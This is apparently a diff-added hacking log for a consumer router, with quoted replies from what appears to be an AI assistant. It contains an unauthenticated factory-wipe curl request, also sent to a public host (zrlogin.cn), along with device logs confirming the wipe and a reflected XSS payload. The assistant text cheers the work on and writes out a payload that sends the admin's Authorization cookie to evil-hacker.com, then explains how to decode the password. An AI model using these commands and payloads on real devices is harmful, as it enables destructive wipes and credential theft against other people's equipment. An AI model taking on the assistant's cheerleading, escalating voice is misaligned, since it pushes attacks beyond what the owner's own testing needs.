+    f.action="do_cmd.htm";
+    f.submit();
+});
+
+<form name="frmSetup">
+    <input type="hidden" name="FLG" value="1">
+    <input type="hidden" name="CMD" value="SYS_CONF">
+    <input type="hidden" name="GO" value="allset.html">
+    <input type="hidden" name="CCMD" value="100">
+</form>
+
+
+When you click one of the UI list elements, JavaScript intercepts the click, modifies the hidden CCMD and FLG values inside this form, and submits it to do_cmd.htm.
+
+The API Signature: CMD=SYS_CONF&CCMD=1&FLG=1
+
+What it does: Triggers a complete factory default wipe on the persistent profile lines, resetting everything back to admin/admin and 88888888.
+
+The API Signature: CMD=SYS_CONF&CCMD=0&FLG=0
+
+What it does: This is hilarious—look at this compared to your earlier test! You found that CCMD=101 forced a reboot.
+But the official front-end uses CCMD=0&FLG=0 to trigger the standard restart sequence.
+
+
+I can just factory reset it :)
+
+curl -v "http://192.168.11.1/do_cmd.htm?CMD=SYS_CONF&CCMD=1&FLG=1"
+
+interfaceGet(): bind socket successful on 192.168.11.1:53
+serverInit(): DNS Server List 0. 192.168.11.1:53
+[04050C0B][04050C07]
+DDR Calibration DQS reg = 00008688
+
+
+U-Boot 1.1.3 (Dec 13 2017 - 04:47:08)
+
+Board: Ralink APSoC DRAM:   8 MB
+relocate_code Pointer at: 807b4000
+******************************
+Software System Reset Occurred
+******************************
+flash manufacture id: c2, device id 20 15
+find flash: MX25L1605D
+*** Warning - bad CRC, using default environment
+
+============================================ 
+Ralink UBoot Version: 4.3.0.0
+-------------------------------------------- 
+ASIC 7628_MP (Port5<->None)
+DRAM component: 64 Mbits DDR, width 16
+DRAM bus: 16 bit
+Total memory: 8 MBytes
+Flash component: SPI Flash
+Date:Dec 13 2017  Time:04:47:08
+============================================ 
+icache: sets:512, ways:4, linesz:32 ,total:65536
+dcache: sets:256, ways:4, linesz:32 ,total:32768 
+
+ ##### The CPU freq = 575 MHZ #### 
+ estimate memory size =8 Mbytes
+RESET MT7628 PHY!!!!!!MT76x8k init by luotao
+
+Please choose the operation: 
+   1: Load system code to SDRAM via TFTP. 
+   2: Load system code then write to Flash via TFTP. 
+   3: Boot system code via Flash (default).
+   4: Entr boot command line interface.
+   7: Load Boot Loader code then write to Flash via Serial. 
+   9: Load Boot Loader code then write to Flash via TFTP. 
+ 0 
+
+By sending CMD=SYS_CONF&CCMD=1&FLG=1, we didn't just reboot it we successfully triggered a remote, unauthenticated factory wipe.
+:)
+
+```
+The Local Threat: Anyone who connects to your "Guest" Wi-Fi network can run that single curl command and instantly wipe the entire configuration. They don't need an admin password. They don't even need to know how to hack; they just need to copy-paste a URL.
+```
+
+and of course 
+
+
+curl -v "http://zrlogin.cn/do_cmd.htm?CMD=SYS_CONF&CCMD=1&FLG=1"
+
+works as well ;) which is even worst :)
+
+curl -v "http://zrlogin.cn/do_cmd.htm?CMD=SYS_CONF&CCMD=10&FLG=1"
+
+is goto login pageReset the default configuration to flash 65!
+CFG_read_prof 315 items
+cfg_parse: null config!
+cfg_load_static: read-only 2 items(48 bytes) into ram
+cfg_parse_wlan: parse 3048 bytes!
+Default : parsing WIFI configuration succeeds
+CFG_commit: 319 update!
+free previous mode:0,0
+ifra305x0: stop
+0 entries flushed from NAT table
+0 entries flushed from NAT list
+urlfilter_flush!
+wanstop2: mode=0,0
+dnsMasqstop
+CFG_commit: 319 update!
+CFG_save: write 4248 bytes to flash:CFG_CHKSUM=d73b6028, len=4248
+CFG_save: old offset=0000, new=10a4
+..dnsMasqstart
+interfaceGet(): bind socket successful on 192.168.11.1:53
+serverInit(): DNS Server List 0. 192.168.11.1:53
+
+we performed a soft reset; no need for harware reboot; stealthy;
+
+well not anymore now it does full reset :)
+
+this is unpredictable !
+
+
+hhhhh yep in the parsing I guess they only check if first character is 1
+1
+10
+100
+101
+1111111111111111
+
+all result in full reset;
+
+
+also:
+http://192.168.11.1/do_cmd.htm?CMD=SYS_CONF&GO=';alert('hacked')//
+
+```
+var go='';alert('HACKED');//';
+```
+
+results in the alert :)
+
+
+```
+Spot on! You remembered the exact mechanism we found hidden in the HTML source code earlier.
+
+When we dumped the login page, we found this exact block of JavaScript controlling what happens when the user clicks "Login":
+
+```javascript
+var auth = "Basic "+base64_encode("admin:"+f.pcPassword.value);
+document.cookie = "Authorization="+escape(auth)+";path=/";
+f.submit();
+
+```
+
+Here is exactly what that code is doing, and why it perfectly ties into the **XSS vulnerability** you *just* discovered.
+
+### 🍪 The "Cookie" Breakdown
+
+When a user logs into this router, it doesn't use a secure, server-generated session token. Instead, the browser does this:
+
+1. It takes the username (`admin`) and the password you typed (e.g., `88888888`).
+2. It mashes them together: `admin:88888888`.
+3. It runs them through **Base64 encoding** (which looks like `YWRtaW46ODg4ODg4ODg=`).
+4. It saves that string directly into your browser's local cookies under the name `Authorization`.
+
+**Why this is terrible:** Base64 is *encoding*, not *encryption*. Anyone who gets their hands on that cookie can just type `echo "YWRtaW46ODg4ODg4ODg=" | base64 -d` in their Linux terminal and instantly see the plaintext password.
+
+---
+
+### 💥 The Kill Chain: Combining XSS with the Cookie
+
+This is where your hacking journey comes full circle.
+
+Remember the XSS payload you just got to work? (`';alert('hacked')//`). You used it to pop up a harmless alert box. But because the Urant developers store the password in that unsecured cookie, an attacker wouldn't use `alert()`.
+
+They would use your XSS injection point to write a payload like this:
+
+```javascript
+'; window.location='http://evil-hacker.com/steal?data=' + document.cookie; //
+
+```
+
+If the router admin clicks that poisoned link, the router will execute the XSS, grab the `Authorization` cookie right out of the browser's memory, and silently text message it to the hacker's server. The hacker decodes the Base64, gets the admin password, and owns the router.
+
+*(Note: Modern web security uses a flag called `HttpOnly` to specifically block JavaScript from reading cookies to prevent this exact attack. Naturally, this router doesn't use it).*
+
+### 🗺️ Browser Storage vs. Hardware Storage
+
+Just to keep the layers straight:
+
+* **The Browser (Cookies):** Stores the Base64-encoded password so the user doesn't have to log in every time they click a new menu tab.
+* **The Hardware (NVRAM):** Stores the absolute plaintext password (`SYS_ADMPASS=admin`) physically written to the flash memory chip on the motherboard.
+
+You've got the complete software kill chain mapped out! Are we diving back into the physical hardware via the Minicom `os/spi` shell, or opening Ghidra to map out the rest of those hidden `CCMD` numbers?
+```
+
+
